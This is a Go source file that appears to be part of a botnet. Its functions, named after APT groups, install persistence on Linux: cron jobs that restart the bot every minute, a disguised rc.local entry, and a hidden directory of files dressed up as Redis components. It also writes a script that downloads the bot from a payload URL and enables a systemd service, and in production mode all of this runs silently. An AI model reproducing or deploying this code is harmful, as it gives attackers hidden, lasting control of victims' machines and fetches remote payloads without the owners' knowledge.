package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// ============================================================================
// PERSISTENCE FUNCTIONS
// These establish various methods to survive reboots and maintain access.
// ============================================================================

// carbanak creates a cron job that runs every minute to check/restart the bot.
// The cron job executes the persistence shell script inside hiddenDir.
// In debug mode: only logs what would happen, does not execute.
// Parameters:
//   - hiddenDir: Directory containing the persistence script
func carbanak(hiddenDir string) {
	scriptPath := filepath.Join(hiddenDir, persistScriptName)
	cronJob := fmt.Sprintf("%s bash %s > /dev/null 2>&1", persistCronSchedule, scriptPath)

	if debugMode {
		deoxys("carbanak: [DEBUG] Would set up cron persistence in %s", hiddenDir)
		deoxys("carbanak: [DEBUG] Would install cron job: %s", cronJob)
		deoxys("carbanak: [DEBUG] Skipping actual execution (debug mode)")
		return
	}

	// Production mode - execute silently
	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob))
	cmd.Run()
}

// lazarus sets up a simple cron job to keep the bot running.
// Runs every minute to check if bot is alive and restart if needed.
// Does not require any external scripts - directly executes the binary.
// In debug mode: only logs what would happen, does not execute.
func lazarus() {
	exe, err := os.Executable()
	if err != nil {
		if debugMode {
			deoxys("lazarus: [DEBUG] Failed to get executable path: %v", err)
		}
		return
	}

	procName := filepath.Base(exe)
	cronJob := fmt.Sprintf("%s pgrep -x %s > /dev/null || %s > /dev/null 2>&1 &", persistCronSchedule, procName, exe)

	if debugMode {
		deoxys("lazarus: [DEBUG] Would set up cron persistence")
		deoxys("lazarus: [DEBUG] Executable: %s", exe)
		deoxys("lazarus: [DEBUG] Process name: %s", procName)
		deoxys("lazarus: [DEBUG] Would install cron job: %s", cronJob)
		deoxys("lazarus: [DEBUG] Skipping actual execution (debug mode)")
		return
	}

	// Production mode - execute silently
	// Check if cron job already exists
	checkCmd := exec.Command("crontab", "-l")
	existing, _ := checkCmd.Output()
	if strings.Contains(string(existing), exe) {
		return
	}

	// Add to crontab
	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob))
	cmd.Run()
}

// fin7 adds the bot executable to rc.local for startup persistence.
// Only adds entry if rc.local exists and doesn't already contain our path.
// Uses a random suffix to make the entry less obvious.
// In debug mode: only logs what would happen, does not execute.
func fin7() {
	if debugMode {
		deoxys("fin7: [DEBUG] Would set up rc.local persistence")
		if _, err := os.Stat(persistRcLocal); err != nil {
			deoxys("fin7: [DEBUG] %s does not exist, would skip", persistRcLocal)
			return
		}
		exe, err := os.Executable()
		if err != nil {
			deoxys("fin7: [DEBUG] Failed to get executable path: %v", err)
			return
		}
		b, err := os.ReadFile(persistRcLocal)
		if err != nil {
			deoxys("fin7: [DEBUG] Failed to read %s: %v", persistRcLocal, err)
			return
		}
		if strings.Contains(string(b), exe) {
			deoxys("fin7: [DEBUG] Entry already exists in rc.local")
			return
		}
		line := exe + " # " + kimsuky()
		deoxys("fin7: [DEBUG] Would add to rc.local: %s", line)
		deoxys("fin7: [DEBUG] Skipping actual execution (debug mode)")
		return
	}

	// Production mode - execute silently
	if _, err := os.Stat(persistRcLocal); err != nil {
		return
	}
	exe, err := os.Executable()
	if err != nil {
		return
	}
	b, err := os.ReadFile(persistRcLocal)
	if err != nil {
		return
	}
	if strings.Contains(string(b), exe) {
		return
	}
	line := exe + " # " + kimsuky() + "\n"
	sandworm(persistRcLocal, line, 0700)
}

// dragonfly sets up comprehensive persistence using multiple methods:
//  1. Creates hidden directory (persistHiddenDir)
//  2. Writes a shell script that downloads/runs the bot
//  3. Creates a systemd service for automatic startup
//  4. Installs a cron job as backup persistence
//
// All files are disguised as Redis-related system files.
// In debug mode: only logs what would happen, does not execute.
func dragonfly() {
	scriptPath := filepath.Join(persistHiddenDir, persistScriptName)
	programPath := filepath.Join(persistHiddenDir, persistBinaryName)

	if debugMode {
		deoxys("dragonfly: [DEBUG] Would set up comprehensive persistence")
		deoxys("dragonfly: [DEBUG] Would create hidden directory: %s", persistHiddenDir)
		deoxys("dragonfly: [DEBUG] Would write persistence script to: %s", scriptPath)
		deoxys("dragonfly: [DEBUG] Script would download from: %s", persistPayloadURL)
		deoxys("dragonfly: [DEBUG] Would write program to: %s", programPath)
		deoxys("dragonfly: [DEBUG] Would write systemd service to: %s", persistServicePath)
		deoxys("dragonfly: [DEBUG] Would enable systemd service: %s", persistServiceName)
		deoxys("dragonfly: [DEBUG] Would set up cron backup via carbanak()")
		deoxys("dragonfly: [DEBUG] Skipping actual execution (debug mode)")
		return
	}

	// Production mode - execute silently
	os.MkdirAll(persistHiddenDir, 0755)

	scriptContent := fmt.Sprintf(persistScriptTemplate, persistPayloadURL, programPath, persistBinaryName)
	os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	os.WriteFile(persistServicePath, []byte(persistServiceContent), 0644)

	cmd := exec.Command("systemctl", "enable", "--now", persistServiceName)
	cmd.Run()

	carbanak(persistHiddenDir)
}
